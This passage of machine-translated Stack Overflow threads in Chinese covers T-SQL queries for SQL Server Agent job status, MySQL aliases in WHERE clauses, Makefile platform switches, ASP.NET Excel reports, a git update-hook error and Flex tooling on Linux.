* * *

## 回答 #4

> 赞同：15
> 
> 时间：2012-04-03T12:43:37.580

```
-- Microsoft SQL Server 2008 Standard Edition:
IF EXISTS(SELECT 1 
          FROM msdb.dbo.sysjobs J 
          JOIN msdb.dbo.sysjobactivity A 
              ON A.job_id=J.job_id 
          WHERE J.name=N'Your Job Name' 
          AND A.run_requested_date IS NOT NULL 
          AND A.stop_execution_date IS NULL
         )
    PRINT 'The job is running!'
ELSE
    PRINT 'The job is not running.' 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2011-11-11T14:49:34.257

我们可以通过多种方式查询 msdb 以获取详细信息。

少数是

```
select job.Name, job.job_ID, job.Originating_Server,activity.run_requested_Date,
datediff(minute, activity.run_requested_Date, getdate()) as Elapsed 
from msdb.dbo.sysjobs_view job 
inner join msdb.dbo.sysjobactivity activity on (job.job_id = activity.job_id) 
where run_Requested_date is not null 
and stop_execution_date is null 
and job.name like 'Your Job Prefix%' 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-04-18T19:09:16.190

这将显示上次运行状态/时间，或者如果正在运行，它会显示当前运行时间、步骤编号/信息和 SPID（如果它具有关联的 SPID）。它还显示启用/禁用和作业用户，其中它为未解析的用户帐户转换为 NT SID 格式。

```
CREATE TABLE #list_running_SQL_jobs
(
    job_id UNIQUEIDENTIFIER NOT NULL
  , last_run_date INT NOT NULL
  , last_run_time INT NOT NULL
  , next_run_date INT NOT NULL
  , next_run_time INT NOT NULL
  , next_run_schedule_id INT NOT NULL
  , requested_to_run INT NOT NULL
  , request_source INT NOT NULL
  , request_source_id sysname NULL
  , running INT NOT NULL
  , current_step INT NOT NULL
  , current_retry_attempt INT NOT NULL
  , job_state INT NOT NULL
);

DECLARE @sqluser NVARCHAR(128)
      , @is_sysadmin INT;

SELECT @is_sysadmin = ISNULL(IS_SRVROLEMEMBER(N'sysadmin'), 0);

DECLARE read_sysjobs_for_running CURSOR FOR
    SELECT DISTINCT SUSER_SNAME(owner_sid)FROM msdb.dbo.sysjobs;
OPEN read_sysjobs_for_running;
FETCH NEXT FROM read_sysjobs_for_running
INTO @sqluser;

WHILE @@FETCH_STATUS = 0
BEGIN
    INSERT INTO #list_running_SQL_jobs
    EXECUTE master.dbo.xp_sqlagent_enum_jobs @is_sysadmin, @sqluser;
    FETCH NEXT FROM read_sysjobs_for_running
    INTO @sqluser;
END;

CLOSE read_sysjobs_for_running;
DEALLOCATE read_sysjobs_for_running;

SELECT j.name
     , 'Enbld' = CASE j.enabled
                     WHEN 0
                         THEN 'no'
                     ELSE 'YES'
                 END
     , '#Min' = DATEDIFF(MINUTE, a.start_execution_date, ISNULL(a.stop_execution_date, GETDATE()))
     , 'Status' = CASE
                      WHEN a.start_execution_date IS NOT NULL
                          AND a.stop_execution_date IS NULL
                          THEN 'Executing'
                      WHEN h.run_status = 0
                          THEN 'FAILED'
                      WHEN h.run_status = 2
                          THEN 'Retry'
                      WHEN h.run_status = 3
                          THEN 'Canceled'
                      WHEN h.run_status = 4
                          THEN 'InProg'
                      WHEN h.run_status = 1
                          THEN 'Success'
                      ELSE 'Idle'
                  END
     , r.current_step
     , spid = p.session_id
     , owner = ISNULL(SUSER_SNAME(j.owner_sid), 'S-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 1))) - CONVERT(BIGINT, 256) * CONVERT(BIGINT, UNICODE(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 1)) / 256)) + '-' + CONVERT(NVARCHAR(12), UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 4), 1)) / 256 + CONVERT(BIGINT, NULLIF(UNICODE(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 1)) / 256, 0)) - CONVERT(BIGINT, UNICODE(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 1)) / 256)) + ISNULL('-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 5), 1))) + CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 6), 1))) * CONVERT(BIGINT, 65536) + CONVERT(BIGINT, NULLIF(SIGN(LEN(CONVERT(NVARCHAR(256), j.owner_sid)) - 6), -1)) * 0), '') + ISNULL('-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 7), 1))) + CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 8), 1))) * CONVERT(BIGINT, 65536) + CONVERT(BIGINT, NULLIF(SIGN(LEN(CONVERT(NVARCHAR(256), j.owner_sid)) - 8), -1)) * 0), '') + ISNULL('-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 9), 1))) + CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 10), 1))) * CONVERT(BIGINT, 65536) + CONVERT(BIGINT, NULLIF(SIGN(LEN(CONVERT(NVARCHAR(256), j.owner_sid)) - 10), -1)) * 0), '') + ISNULL('-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 11), 1))) + CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 12), 1))) * CONVERT(BIGINT, 65536) + CONVERT(BIGINT, NULLIF(SIGN(LEN(CONVERT(NVARCHAR(256), j.owner_sid)) - 12), -1)) * 0), '') + ISNULL('-' + CONVERT(NVARCHAR(12), CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 13), 1))) + CONVERT(BIGINT, UNICODE(RIGHT(LEFT(CONVERT(NVARCHAR(256), j.owner_sid), 14), 1))) * CONVERT(BIGINT, 65536) + CONVERT(BIGINT, NULLIF(SIGN(LEN(CONVERT(NVARCHAR(256), j.owner_sid)) - 14), -1)) * 0), '')) --SHOW as NT SID when unresolved
     , a.start_execution_date
     , a.stop_execution_date
     , t.subsystem
     , t.step_name
FROM msdb.dbo.sysjobs j
    LEFT OUTER JOIN (SELECT DISTINCT * FROM #list_running_SQL_jobs) r
        ON j.job_id = r.job_id
    LEFT OUTER JOIN msdb.dbo.sysjobactivity a
        ON j.job_id = a.job_id
            AND a.start_execution_date IS NOT NULL
            --AND a.stop_execution_date IS NULL
            AND NOT EXISTS
            (
                SELECT *
                FROM msdb.dbo.sysjobactivity at
                WHERE at.job_id = a.job_id
                    AND at.start_execution_date > a.start_execution_date
            )
    LEFT OUTER JOIN sys.dm_exec_sessions p
        ON p.program_name LIKE 'SQLAgent%0x%'
            AND j.job_id = SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 7, 2) + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 5, 2) + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 3, 2) + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 1, 2) + '-' + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 11, 2) + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 9, 2) + '-' + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 15, 2) + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 13, 2) + '-' + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 17, 4) + '-' + SUBSTRING(SUBSTRING(p.program_name, CHARINDEX('0x', p.program_name) + 2, 32), 21, 12)
    LEFT OUTER JOIN msdb.dbo.sysjobhistory h
        ON j.job_id = h.job_id
            AND h.instance_id = a.job_history_id
    LEFT OUTER JOIN msdb.dbo.sysjobsteps t
        ON t.job_id = j.job_id
            AND t.step_id = r.current_step
ORDER BY 1;

DROP TABLE #list_running_SQL_jobs; 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-14T07:26:37.130

您尚未指定希望如何查看这些详细信息。

对于第一眼，我建议检查[Server Management Studio](http://www.microsoft.com/downloads/info.aspx?na=22&p=1&SrcDisplayLang=en&SrcCategoryId=&SrcFamilyId=&u=%2fdownloads%2fdetails.aspx%3fFamilyID%3dc243a5ae-4bd1-4e3d-94b8-5a0f62bf7796%26DisplayLang%3den)。

您可以在“作业”下的 SQL Server 代理部分中查看作业和当前状态。如果您选择一个工作，“属性”页面会显示一个指向“工作历史”的链接，您可以在其中查看开始和结束时间、是否有任何错误、哪个步骤导致了错误等等。

您可以指定警报和通知，以便在作业成功完成或失败时向您发送电子邮件或寻呼您。

有一个作业活动监视器，但实际上我从未使用过它。你可以试一试。

如果你想通过 T-SQL 检查它，那么我不知道你该怎么做。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-04-04T16:08:53.883

```
SELECT sj.name
  FROM msdb..sysjobactivity aj
  JOIN msdb..sysjobs sj
    on sj.job_id = aj.job_id
 WHERE aj.stop_execution_date  IS NULL     -- job hasn't stopped running
   AND aj.start_execution_date IS NOT NULL -- job is currently running
   AND sj.name = '<your Job Name>'
   AND NOT EXISTS( -- make sure this is the most recent run
                   select 1
                     from msdb..sysjobactivity new
                    where new.job_id = aj.job_id
                      and new.start_execution_date > aj.start_execution_date ) )
print 'running' 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2017-06-29T14:59:35.803

这是一个老问题，但我刚刚遇到了类似的情况，我需要检查 SQL Server 上的作业状态。很多人提到 sysjobactivity 表并指出 MSDN 文档很棒。但是，我还想强调一下[作业活动监视器](https://msdn.microsoft.com/en-us/library/ms187449(v=sql.105).aspx)，它提供了在您的服务器上定义的所有作业的状态。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2021-05-06T15:29:21.893

我使用评分最高的答案创建了一个简单的 SQL 函数来检查 SQL 代理作业是否已经在运行：

```
-- ===================================================================================
-- Function: "IsJobAlreadyRunning"  |  Author: Geoff Griswald  |  Created: 2021-05-06
-- Description: Check if a SQL Agent Job is already Running - Return 1 if Yes, 0 if No
-- ===================================================================================
CREATE FUNCTION dbo.IsJobAlreadyRunning (@AgentJobName varchar(140))
RETURNS bit
AS
BEGIN
DECLARE @Result bit = 0
     IF EXISTS (SELECT job.name
                  FROM msdb.dbo.sysjobs_view job
            INNER JOIN msdb.dbo.sysjobactivity activity ON job.job_id = activity.job_id
            INNER JOIN msdb.dbo.syssessions sess ON sess.session_id = activity.session_id
            INNER JOIN (SELECT MAX(agent_start_date) AS max_agent_start_date
                          FROM msdb.dbo.syssessions) sess_max ON sess.agent_start_date = sess_max.max_agent_start_date
                 WHERE run_requested_date IS NOT NULL 
                   AND stop_execution_date IS NULL
                   AND job.name = @AgentJobName)
   SET @Result = 1
RETURN @Result
END; 
```

这很有用，因为我可以调用此函数并在我尝试启动它之前检查我想要启动的作业是否已经在运行，而不会给我的代码添加大量臃肿。例如：

```
DECLARE @JobName varchar(140) = 'MyAgentJobName'
     IF (SELECT dbo.IsJobAlreadyRunning(@JobName)) = 0
   EXEC msdb.dbo.sp_start_job @JobName 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-06-17T17:10:08.047

上面的任务有效，但我在 msdb.dbo.sysjobactivity 中看到了许多记录， **其中 run_Requested_date 不为空，stop_execution_date 为空** ----并且作业当前未运行。

我建议运行以下脚本来清除所有虚假条目（确保当时没有作业正在运行）。

SQL2008：

```
 delete activity
    from msdb.dbo.sysjobs_view job  
    inner join msdb.dbo.sysjobactivity activity on job.job_id = activity.job_id 
    where  
        activity.run_Requested_date is not null  
    and activity.stop_execution_date is null 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-09-19T23:06:23.293

我在我的一台服务器上查询 MSDB 表（也就是上面列出的代码）时遇到了问题，因为我的一项工作会开始运行，但事实并非如此。有一个系统存储过程可以返回执行状态，但是不能执行插入 exec 语句而不会出错。里面是另一个可以与 insert exec 语句一起使用的系统存储过程。

```
INSERT INTO #Job
EXEC master.dbo.xp_sqlagent_enum_jobs 1,dbo 
```

以及将其加载到的表：

```
CREATE TABLE #Job 
               (job_id               UNIQUEIDENTIFIER NOT NULL,  
               last_run_date         INT              NOT NULL,  
               last_run_time         INT              NOT NULL,  
               next_run_date         INT              NOT NULL,  
               next_run_time         INT              NOT NULL,  
               next_run_schedule_id  INT              NOT NULL,  
               requested_to_run      INT              NOT NULL, -- BOOL  
               request_source        INT              NOT NULL,  
               request_source_id     sysname          COLLATE database_default NULL,  
               running               INT              NOT NULL, -- BOOL  
               current_step          INT              NOT NULL,  
               current_retry_attempt INT              NOT NULL,  
               job_state             INT              NOT NULL) 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2020-06-12T10:20:49.243

下面的脚本获取服务器上每个作业的作业状态。它还告诉那里有多少步，当前正在运行的步和经过的时间是什么。

```
SELECT sj.Name,
    CASE
        WHEN sja.start_execution_date IS NULL THEN 'Never ran'
        WHEN sja.start_execution_date IS NOT NULL AND sja.stop_execution_date IS NULL THEN 'Running'
        WHEN sja.start_execution_date IS NOT NULL AND sja.stop_execution_date IS NOT NULL THEN 'Not running'
    END AS 'RunStatus',
    CASE WHEN sja.start_execution_date IS NOT NULL AND sja.stop_execution_date IS NULL then js.StepCount else null end As TotalNumberOfSteps,
    CASE WHEN sja.start_execution_date IS NOT NULL AND sja.stop_execution_date IS NULL then ISNULL(sja.last_executed_step_id+1,js.StepCount) else null end as currentlyExecutingStep,
    CASE WHEN sja.start_execution_date IS NOT NULL AND sja.stop_execution_date IS NULL then datediff(minute, sja.run_requested_date, getdate()) ELSE NULL end as ElapsedTime
FROM msdb.dbo.sysjobs sj
JOIN msdb.dbo.sysjobactivity sja
ON sj.job_id = sja.job_id
CROSS APPLY (SELECT COUNT(*) FROM msdb.dbo.sysjobsteps as js WHERE js.job_id = sj.job_id) as js(StepCount)
WHERE session_id = (
    SELECT MAX(session_id) FROM msdb.dbo.sysjobactivity)
ORDER BY RunStatus desc 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-08-07T15:26:19.987

我发现最简单的方法是创建一个存储过程。输入“工作名称”并点击开始。

```
/*-----------------------------------------------------------------------------------------------------------

    Document Title: usp_getJobStatus

    Purpose:        Finds a Current Jobs Run Status     
    Input Example:  EXECUTE usp_getJobStatus 'MyJobName'

-------------------------------------------------------------------------------------------------------------*/

    IF OBJECT_ID ( 'usp_getJobStatus','P' ) IS NOT NULL
    DROP PROCEDURE  usp_getJobStatus;

    GO

        CREATE PROCEDURE  usp_getJobStatus 
                          @JobName NVARCHAR (1000)

    AS

        IF OBJECT_ID('TempDB..#JobResults','U') IS NOT NULL DROP TABLE #JobResults
        CREATE TABLE #JobResults ( Job_ID   UNIQUEIDENTIFIER NOT NULL, 
                                   Last_Run_Date         INT NOT NULL, 
                                   Last_Run_Time         INT NOT NULL, 
                                   Next_Run_date         INT NOT NULL, 
                                   Next_Run_Time         INT NOT NULL, 
                                   Next_Run_Schedule_ID  INT NOT NULL, 
                                   Requested_to_Run      INT NOT NULL,
                                   Request_Source        INT NOT NULL, 
                                   Request_Source_id     SYSNAME 
                                   COLLATE Database_Default      NULL, 
                                   Running               INT NOT NULL,
                                   Current_Step          INT NOT NULL, 
                                   Current_Retry_Attempt INT NOT NULL, 
                                   Job_State             INT NOT NULL ) 

        INSERT  #JobResults 
        EXECUTE master.dbo.xp_sqlagent_enum_jobs 1, '';

        SELECT  job.name                                                AS [Job_Name], 
              ( SELECT  MAX(CAST( STUFF(STUFF(CAST(jh.run_date AS VARCHAR),7,0,'-'),5,0,'-') + ' ' + 
                        STUFF(STUFF(REPLACE(STR(jh.run_time,6,0),' ','0'),5,0,':'),3,0,':') AS DATETIME))
                FROM    msdb.dbo.sysjobs AS j 
                    INNER JOIN msdb.dbo.sysjobhistory AS jh 
                       ON jh.job_id = j.job_id AND jh.step_id = 0 
                WHERE j.[name] LIKE '%' + @JobName + '%' 
                GROUP BY j.[name] )                                     AS [Last_Completed_DateTime], 
              ( SELECT  TOP 1 start_execution_date 
                FROM    msdb.dbo.sysjobactivity
                WHERE   job_id = r.job_id
                ORDER BY start_execution_date DESC )                    AS [Job_Start_DateTime],
            CASE 
                WHEN r.running = 0 THEN
                    CASE 
                        WHEN jobInfo.lASt_run_outcome = 0 THEN 'Failed'
                        WHEN jobInfo.lASt_run_outcome = 1 THEN 'Success'
                        WHEN jobInfo.lASt_run_outcome = 3 THEN 'Canceled'
                        ELSE 'Unknown'
                    END
                        WHEN r.job_state = 0 THEN 'Success'
                        WHEN r.job_state = 4 THEN 'Success'
                        WHEN r.job_state = 5 THEN 'Success'
                        WHEN r.job_state = 1 THEN 'In Progress'
                        WHEN r.job_state = 2 THEN 'In Progress'
                        WHEN r.job_state = 3 THEN 'In Progress'
                        WHEN r.job_state = 7 THEN 'In Progress'
                     ELSE 'Unknown' END                                 AS [Run_Status_Description]
        FROM    #JobResults AS r 
            LEFT OUTER JOIN msdb.dbo.sysjobservers AS jobInfo 
               ON r.job_id = jobInfo.job_id 
            INNER JOIN msdb.dbo.sysjobs AS job 
               ON r.job_id = job.job_id 
        WHERE   job.[enabled] = 1
                AND job.name LIKE '%' + @JobName + '%' 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-04-06T06:40:00.907

```
;WITH CTE_JobStatus
AS (
    SELECT DISTINCT NAME AS [JobName]
        ,s.step_id
        ,s.step_name
        ,CASE 
            WHEN [Enabled] = 1
                THEN 'Enabled'
            ELSE 'Disabled'
            END [JobStatus]
        ,CASE 
            WHEN SJH.run_status = 0
                THEN 'Failed'
            WHEN SJH.run_status = 1
                THEN 'Succeeded'
            WHEN SJH.run_status = 2
                THEN 'Retry'
            WHEN SJH.run_status = 3
                THEN 'Cancelled'
            WHEN SJH.run_status = 4
                THEN 'In Progress'
            ELSE 'Unknown'
            END [JobOutcome]
        ,CONVERT(VARCHAR(8), sjh.run_date) [RunDate]
        ,CONVERT(VARCHAR(8), STUFF(STUFF(CONVERT(TIMESTAMP, RIGHT('000000' + CONVERT(VARCHAR(6), sjh.run_time), 6)), 3, 0, ':'), 6, 0, ':')) RunTime
        ,RANK() OVER (
            PARTITION BY s.step_name ORDER BY sjh.run_date DESC
                ,sjh.run_time DESC
            ) AS rn
        ,SJH.run_status
    FROM msdb..SYSJobs sj
    INNER JOIN msdb..SYSJobHistory sjh ON sj.job_id = sjh.job_id
    INNER JOIN msdb.dbo.sysjobsteps s ON sjh.job_id = s.job_id
        AND sjh.step_id = s.step_id
    WHERE (sj.NAME LIKE 'JOB NAME')
        AND sjh.run_date = CONVERT(CHAR, getdate(), 112)
    )
SELECT *
FROM CTE_JobStatus
WHERE rn = 1
    AND run_status NOT IN (1,4) 
```

# mysql - 你可以在mysql的WHERE子句中使用别名吗？

> ID：200200
> 
> 赞同：123
> 
> 时间：2008-10-14T06:49:45.737
> 
> 标签：mysql, sql, having, having-clause

我需要在 WHERE 子句中使用别名，但它一直告诉我它是一个未知列。有没有办法解决这个问题？我需要选择评级高于 x 的记录。评级计算为以下别名：

```
sum(reviews.rev_rating)/count(reviews.rev_id) as avg_rating 
```

* * *

## 回答 #1

> 赞同：237
> 
> 时间：2008-10-14T06:52:00.693

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2008-10-14T07:08:27.743

我不知道这是否适用于 mysql，但使用 sqlserver 你也可以像这样包装它：

```
select * from (
  -- your original query
  select .. sum(reviews.rev_rating)/count(reviews.rev_id) as avg_rating 
  from ...) Foo
where Foo.avg_rating ... 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2017-07-10T14:35:41.807

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-07-19T07:04:52.550

```
SELECT * FROM (SELECT customer_Id AS 'custId', gender, age FROM customer
    WHERE  gender = 'F') AS c
WHERE c.custId = 100; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-10-20T21:39:40.530

如果您的查询是静态的，您可以将其定义为视图，然后您可以在查询视图时在 where 子句中使用该别名。

# makefile - 在 Makefile 中进行“切换”的好方法

> ID：200205
> 
> 赞同：20
> 
> 时间：2008-10-14T06:52:23.797
> 
> 标签：makefile, switch-statement

我正在工作中尝试更新的构建系统；目前，我正在尝试找到一种根据目标平台设置编译器和标志的好方法。

我想做的是

```
switch $(PLATFORM)_$(BUILD_TYPE)
  case "Linux_x86_release"
     CFLAGS = -O3
  case "Linux_x86_debug"
     CFLAGS = -O0 -g
  case "ARM_release"
     CC = armcc
     AR = armlink
     CFLAGS = -O2 -fx
     ... 
```

GNU Make 不支持。现在，我的第一个想法是做

```
-include $(PLATFORM)_$(BUILD_TYPE) 
```

这是一个相当不错的解决方案，但是，很难了解文件之间的差异，更不用说我期待编写和维护一个好的 60-80 个文件，每个文件都包含一组变量定义.

有没有人碰巧知道更好的方法来做到这一点？即基于另一个变量设置一组标志和其他选项？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2008-10-14T07:22:11.460

怎么样：

```
CFLAGS_Linux_x86_release        = -O3
CFLAGS_Linux_x86_debug          = -O0 -g

CFLAGS  = ${CFLAGS_${PLATFORM}_${BUILD}} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-14T07:09:42.500

配置这些参数将是`configure`脚本的任务。

话虽如此，您可以查看[条件](http://www.gnu.org/software/make/manual/make.html#Conditionals)和[条件函数](http://www.gnu.org/software/make/manual/make.html#Conditional-Functions)的语法。例如，您可以尝试以下操作：

```
ifeq ($(PLATFORM)_$(BUILD_TYPE),Linux_x86_release)
    CFLAGS = -O3
endif
ifeq ($(PLATFORM)_$(BUILD_TYPE),Linux_x86_debug)
    CFLAGS = -O0 -g
endif 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-14T18:35:25.967

[git](https://git-scm.com)使用的[Makefile](https://raw.githubusercontent.com/git/git/master/Makefile)是 Makefile 的一个很好的例子，它在 Makefile 本身中执行非平凡的配置任务（例如切换主机类型）。它实际上非常易读并且使用起来相当简单。

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2008-10-14T13:55:36.033

切换到为您执行此操作的系统（automake/autoconf）可能更简单......

# asp.net - ASP.Net 应用程序中格式丰富的 Excel 报表

> ID：200212
> 
> 赞同：1
> 
> 时间：2008-10-14T07:01:14.823
> 
> 标签：asp.net, excel, report

如何使用 ASP.Net 应用程序生成格式丰富的 Excel 报告，包括图表？

根据[http://support.microsoft.com/kb/257757](http://support.microsoft.com/kb/257757)服务器端自动化办公是不可取的，而且我们的管理员也不允许在服务器上安装办公

客户还没有准备好在 3rd 方组件上花很多钱

一个必须的要求是保留最终用户使用的格式，并且只使用 excel 2003。

谢谢

**更新：我们正在使用来自**[http://www.carlosag.net/Tools/ExcelXmlWriter/Generator.aspx](http://www.carlosag.net/Tools/ExcelXmlWriter/Generator.aspx)的ExcelXmlWriter，因为它是最合适的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T07:12:21.103

您可能会考虑两个选项：

1) ReportViewer 控件。您可以设计您的报告，包括图表，并将其输出到 Excel。您可以允许报表在控件中显示，或绕过该控件并将其直接导出到 Excel。它将打开的版本取决于客户端安装的内容。

2) 您可以使用 GridView 或嵌入图表图像的普通旧 HTML 表格来创建一个页面，该页面具有您正在寻找的布局。修改响应标头，以便此页面下载为 excel 文件。

如果您需要保留在生成的 Excel 文件中更改数据时更改的 Excel 图表，我不确定在不使用第三方控件或 Office 自动化的情况下是否可行。如果您要嵌入由您的 asp.net 应用程序创建的图表图像，则上述选项有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T07:17:48.783

例如，您可以使用这个[Excel XML 库](http://www.carlosag.net/Tools/ExcelXmlWriter/)进行丰富的格式化，但不幸的是那里没有图表。

如果没有任何第三方组件和 Office 自动化（实际上不建议在服务器上使用），您基本上拥有 JasonS 提出的两个选项。

# git - git中的“项目描述文件”错误？

> ID：200213
> 
> 赞同：11
> 
> 时间：2008-10-14T07:01:58.397
> 
> 标签：git

我有一个小项目，我想在我们都可以访问的机器上与其他几个人分享。我创建了本地存储库的裸副本

```
git clone --bare --no-hardlinks path/to/.git/ repoToShare.git 
```

然后我将 repoToShare.git 移至服务器。

我可以通过以下方式进行检查：

```
git clone ssh://user@address/opt/gitroot/repoToShare.git/ test 
```

然后我可以在本地 repo 中查看所有内容并对此进行提交。当我尝试将更改推送回远程服务器时，出现以下错误。

```
*** Project description file hasn't been set
error: hooks/update exited with error code 1
error: hook declined to update refs/heads/master 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-10-14T07:16:39.113

Git 在 hooks 目录中安装了一堆预先配置的钩子，它们不执行开箱即用。如果您碰巧允许对它们执行（例如 chmod +x），那么 git 将尝试运行它们。弹出特定错误会导致默认更新无法运行。要修复，请删除默认更新挂钩。

[这个链接](http://code.google.com/p/msysgit/issues/detail?id=49#c15)有帮助吗？从文中：

> 我的一位同事在这里遇到了类似的问题，即推送不起作用。您无法推送到本地或远程公共存储库。他得到了 .git/hooks/update 引发的项目描述文件未设置错误。linux 或 Windows 机器上的同一个项目没有发生此错误，并且似乎仅在 Windows Vista 上发生。根据我的研究，钩子/更新默认情况下不会执行，但在 windows vista 中，文件权限意味着它是。删除挂钩/更新解决了这些问题。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2008-12-05T06:14:51.683

删除挂钩/更新不是您想要做的。

只需将 .git/description 更改为您想要的任何内容 - 例如“FOOBAR 存储库”，或者，如果您是法国人，则为“Le depot de FOOBAR”。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-03T23:12:30.440

[从 Mac OS X（Git 版本 1.6.1，使用MacPorts](http://en.wikipedia.org/wiki/MacPorts)编译）推送到 Ubuntu 远程存储库（Git 版本 1.5.4.3）时，我也遇到了这个错误

我已经`.git`在本地和远程存储库的 /description 文件中添加了存储库的名称，并修复了它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-06-19T11:10:23.713

chmod -x 挂钩/更新

从您的 .git 目录执行的上述命令只会从更新挂钩中删除执行权限。无需删除文件

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-08-19T13:04:55.987

删除文件或阻止其执行似乎是极端的解决方案。如果您不想添加项目描述，那么注释就足够了，或者删除 hooks/update 中阻止推送操作的行。在我的文件中，这些行是：

```
# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
if [ -z "$projectdesc" -o "$projectdesc" = "Unnamed repository; edit this file to name it for gitweb." ]; then
       echo "*** Project description file hasn't been set" >&2
       exit 1
fi 
```

当我将它们注释掉时，一切正常。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-06-13T11:15:58.460

我遇到了与@dragulesq 相同的问题，但使用的是[Red Hat](http://en.wikipedia.org/wiki/Red_Hat_Linux)服务器。

为了更详细一点，只需将您想要的任何内容作为字符串放在本地的 .git/description 文件中（在我的情况下是我的 Mac OS X）；我把*website*然后放在托管 Git repo 的远程服务器上（可以这么说）编辑 .git/description 文件并再次放入相同的字符串（例如*website*）。

# linux - Linux上的Flex开发，有什么好的免费环境？

> ID：200219
> 
> 赞同：24
> 
> 时间：2008-10-14T07:07:28.667
> 
> 标签：linux, flash, apache-flex

我想使用 Linux 和免费环境开发 Adob​​e Flex 应用程序。我更喜欢自由替代品，但啤酒也可以。;-)

你们中的任何人都在使用这样的环境开发 Adob​​e Flex 富互联网应用程序吗？还是我应该面对 Flex Builder 是 Fl​​ex 开发必不可少的工具以及没有它我或多或少会迷失的“事实”？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T15:45:42.253

我使用 TextMate 在我的家用计算机（无法运行 FlexBuilder 的 PowerBook G4）上进行一些 Flex hacking，并且我在编写应用程序时没有遇到任何问题。这取决于您是否已经习惯了 IDE 支持以至于没有它就无法生存。我喜欢 Flex Builder 中的代码完成、项目管理和调试器，但我可以没有它。TextMate 不是免费的，但任何具有 ActionScript 代码着色的文本编辑器都可以为我服务。

我通常使用 ant 来管理我的构建，这是免费的。[Flex SDK](https://www.adobe.com/devnet/flex/flex-sdk-download.html)是免费的。这就是你所需要的，再加上一点耐心。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T07:17:29.910

就我个人而言，我只对基于 Eclipse 的 Linux 的 Flex builder 的免费 aplha 版本有经验。但我必须说它已经相当稳定，它提供了 mac osx 和 windows 完整版本中的大多数功能。也许最令人讨厌的是缺少的 gui 编辑器可以快速布置表单。

但是，如果您正在寻找另一种选择，也许这会有所帮助： [http ://www.williambrownstreet.net/wordpress/?p=78](http://www.williambrownstreet.net/wordpress/?p=78)

虽然它不是 IDE

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-07-11T16:57:29.927

[您可以在http://code.google.com/p/fb4linux/](http://code.google.com/p/fb4linux/)中使用插件 fb4linux for eclipse 它在 eclipse 3.6 helios 中完美运行，您可以选择 flex 3 或 flex 4 sdk，但您无法使用 Flex Builder 识别此插件Adobe 的独立版本，具有高光、自动完整代码……祝你好运。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T10:39:05.290

